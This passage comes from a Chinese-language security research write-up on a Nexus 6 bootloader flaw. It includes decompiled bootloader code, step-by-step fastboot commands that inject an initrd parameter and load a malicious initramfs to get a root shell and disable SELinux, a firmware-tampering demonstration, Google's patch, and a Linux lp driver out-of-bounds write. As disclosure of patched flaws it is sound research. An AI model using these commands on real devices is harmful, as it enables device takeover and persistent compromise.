    [...]
      v8 = return11000000();
      v9 = return20000000();
      fastboot_init(v8, v9);
      v11 = sub_FF2EA94(v10);
      if ( v13 != v10021C84 )
        sub_FF3D784();
      return sub_FF15BA4(v11);
    }
    signed int return11000000()
    {
      signed int result; // r0@1
      result = 0x11000000;
      if ( v10021C84 != v10021C84 )
        sub_FF3D784();
      return result;
    }
该值最终被ABOOT的下载处理程序所使用。
总而言之，内存中的initramfs存档被填充到rootfs之前，物理内存的布局如下所示：
现在我们可以将自己的initramfs放到某个固定的物理地址上，然后指导内核填充它。
**十一、创建恶意的initramfs**
最后一个步骤就是创建我们的恶意initramfs。我们可以编译一个userdebug
AOSP启动镜像，删掉其中的initramfs.cpio.gz文件，因为这个文件包含su域以及一个root可用的adbd。只有dm-verity会发出唯一的警告，因为它无法验证官方的system分区（因为AOSP启动镜像会包含调试版的verity_key）。无论如何，既然我们现在可以加载一个恶意的initramfs，我们就可以修改fstab文件（删除验证过程），简单地绕过这个难题，或者我们可以将调试版的verity_key替换为相应的官方发行版。
读者可以从我们的[GitHub仓库](https://github.com/alephsecurity/research/tree/master/initroot)中找到用于PoC演示的initramfs。
**十二、获取root权限**
现在一切条件已经准备就绪：
1、我们有了一个恶意的initramfs存档。
2、我们可以使用fastboot接口，从固定的物理地址上将initramfs载入内存中。
3、我们可以引导Linux内核填充这个initramfs。
对于安全启动流程来说，信任关系已被破坏，如下所示：
成功的攻击过程如下所示：
    $ adb shell
    shamu:/ $ id
    uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
    shamu:/ $ getenforce
    Enforcing
    shamu:/ $ setenforce permissive
    setenforce: Couldn't set enforcing status to 'permissive': Permission denied
    shamu:/ $ reboot bootloader
    $ fastboot getvar unlocked
    [...]
    unlocked: no
    finished. total time: 0.008s
    $ fastboot oem config fsg-id "a initrd=0x11000000,1518172"
    [...]
    (bootloader) 
    (bootloader)   
    (bootloader)     a initrd=0x11000000,1518172
    (bootloader)   
    (bootloader)   
    (bootloader)     FSG IDs, see http://goo.gl/gPmhU
    (bootloader)   
    (bootloader) 
    OKAY [  0.016s]
    finished. total time: 0.016s
    $ fastboot flash aleph malicious.cpio.gz
    [...]
    target reported max download size of 536870912 bytes
    sending 'aleph' (1482 KB)...
    OKAY [  0.050s]
    writing 'aleph'...
    (bootloader) Not allowed in LOCKED state!
    FAILED (remote failure)
    finished. total time: 0.054s
    $ fastboot continue
    [...]
    resuming boot...
    OKAY [  0.007s]
    finished. total time: 0.007s
    $ adb shell
    shamu:/ # id
    uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
    shamu:/ # getenforce
    Enforcing
    shamu:/ # setenforce permissive
    shamu:/ # getenforce
    Permissive
    shamu:/ #
**十三、超越initramfs：固件注入**
现在我们已经完全控制了rootfs，我们可以创建一个恶意的/vendor目录，这个目录通常会包含当前设备可用的各种SoC固件镜像：
    shamu:/ # ls /vendor/firmware
    VRGain.bin adsp.b03 adsp.b11 bcm20795_firmware.ncd left.boost.music.eq left.boost_n1b12.patch right.boost.ringtone.eq right.boost_ringtone_table.preset venus.mdt
    a420_pfp.fw adsp.b04 adsp.b12 bcm4354A2.hcd left.boost.ringtone.config left.boost_n1c2.patch right.boost.speaker right.boost_voice_table.preset widevine.b00
    a420_pm4.fw adsp.b05 adsp.mdt cy8c20247_24lkxi.hex left.boost.ringtone.eq left.boost_ringtone_table.preset right.boost.voice.config venus.b00 widevine.b01
    acdb.mbn adsp.b06 aonvr1.bin fw_bcmdhd.bin left.boost.speaker left.boost_voice_table.preset right.boost.voice.eq venus.b01 widevine.b02
    adsp.b00 adsp.b07 aonvr2.bin fw_bcmdhd_apsta.bin left.boost.voice.config right.boost.music.config right.boost_music_table.preset venus.b02 widevine.b03
    adsp.b01 adsp.b08 atmel-a432-14061601-0102aa-shamu-p1.tdat keymaster left.boost.voice.eq right.boost.music.eq right.boost_n1b12.patch venus.b03 widevine.mdt
    adsp.b02 adsp.b10 atmel-a432-14103001-0103aa-shamu.tdat left.boost.music.config left.boost_music_table.preset right.boost.ringtone.config right.boost_n1c2.patch venus.b04
内核驱动通常会在初始化是使用这些镜像，并在需要的时候更新他们的SoC副本。因此，攻击者可以写入未签名的固件镜像。我们没有确认这种攻击场景是否有效，但根据我们对其他设备的经验，这种场景应该是没问题的。对于签名的固件来说，攻击者可以利用这种方式实现降级攻击。此外，调制解调器固件位于/firmware/image目录下，理论上讲，我们可以通过修改这个目录（如下所示）完成类似攻击。同样，我们也没有去验证设备是否存在某种完整性检查机制，以及设备是否会受到降级攻击，我们可以在未来工作中研究这个问题。
    shamu:/ # umount -f /firmware
    shamu:/ # mount  /dev/block/mmcblk0p1 /firmware -o rw
    shamu:/ # ls /firmware/image
    acdb.mbn bdwlan20.bin cmnlib.b03 efs1.bin isdbtmm.b01 mba_9225.mbn.gz playready.b00 playready.mdt prov.b03 qwlan11.bin sampleapp.b00 sampleapp.mdt securemm.b01 tqs.b00 tqs.mdt utf20.bin
    apps_9225.mbn.gz cmnlib.b00 cmnlib.mdt efs2.bin isdbtmm.b02 mba_9625.mbn.gz playready.b01 prov.b00 prov.mdt qwlan20.bin sampleapp.b01 sbl1_9225.mbn.gz securemm.b02 tqs.b01 tz_9225.mbn.gz
    apps_9625.mbn.gz cmnlib.b01 dsp2_9225.mbn.gz efs3.bin isdbtmm.b03 otp11.bin playready.b02 prov.b01 qdsp6sw_9225.mbn.gz rpm_9225.mbn.gz sampleapp.b02 sbl1_9625.mbn.gz securemm.b03 tqs.b02 tz_9625.mbn.gz
    bdwlan11.bin cmnlib.b02 dsp2_9625.mbn.gz isdbtmm.b00 isdbtmm.mdt otp20.bin playready.b03 prov.b02 qdsp6sw_9625.mbn.gz rpm_9625.mbn.gz sampleapp.b03 securemm.b00 securemm.mdt tqs.b03 utf11.bin
    shamu:/ # echo foo > /firmware/image/foo
    shamu:/ # cat /firmware/image/foo
    foo
**十四、Google的补丁**
Google在2017年5月的[安全公告](http://7%E5%B9%B45%E6%9C%88%E7%9A%84%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A%E4%B8%AD%E5%8F%91%E5%B8%83%E4%BA%86%E8%BF%99%E4%B8%AA)中发布了这个漏洞的补丁。N6F27C版系统中Bootloader版本已升级至moto-apq8084-72.03，这版Bootloader会对fsg-id、carrier以及console的配置参数进行过滤处理：
    $ fastboot oem config fsg-id "foo foo=1"
    [...]
    $ fastboot oem config carrier "bar bar=1"
    [...]
    $ fastboot oem config carrier "baz baz=1"
    [...]
    $ fastboot oem config
    [android@aosp:/aosp/source/android-7.1.1_r40]$ fastboot oem config
    [...]
    (bootloader) 
    (bootloader)   
    (bootloader)     bar
    (bootloader)   
    (bootloader)   
    (bootloader)     Carrier IDs, see http://goo.gl/lojLh3
    (bootloader)   
    (bootloader) 
    (bootloader) 
    (bootloader)   
    (bootloader)     baz
    (bootloader)   
    (bootloader)   
    (bootloader)     Config kernel console log
    (bootloader)       enable|true     - enable with default settings
    (bootloader)       disable|false   - disable
    (bootloader)        - enable with customized settings
    (bootloader)       (e.g.: "ttyHSL0", "ttyHSL0,230400,n8")
    (bootloader)   
    (bootloader) 
    (bootloader) 
    (bootloader)   
    (bootloader)     foo
    (bootloader)   
    (bootloader)   
    (bootloader)     FSG IDs, see http://goo.gl/gPmhU
    (bootloader)   
    (bootloader) ]
**十五、题外话：Linux内核越界写入漏洞（CVE-2017-1000363）**
在本次研究过程中，我们意外发现了另一个漏洞（[CVE-2017-1000363](https://alephsecurity.com/vulns/aleph-2017023)），这是Linux内核中的一个越界写入漏洞，历史非常久远（从2.2.0版本起就已经存在！）。漏洞位于lp驱动中（因此内核参数需为CONFIG_PRINTER=y），当许多lp=none参数被附加到内核命令行中时该漏洞就会被触发：
    static int parport_nr[LP_NO] = { [0 ... LP_NO-1] = LP_PARPORT_UNSPEC };
    [...]
    #ifndef MODULE
    static int __init lp_setup (char *str)
    {
    static int parport_ptr;
    [...]
    } else if (!strcmp(str, "none")) {
    parport_nr[parport_ptr++] = LP_PARPORT_NONE;
    } 
    [...]
    }
    #endif
    [...]
    __setup("lp=", lp_setup);
相应的[补丁](https://alephsecurity.com/vulns/aleph-2017023)已经提交到主线内核上。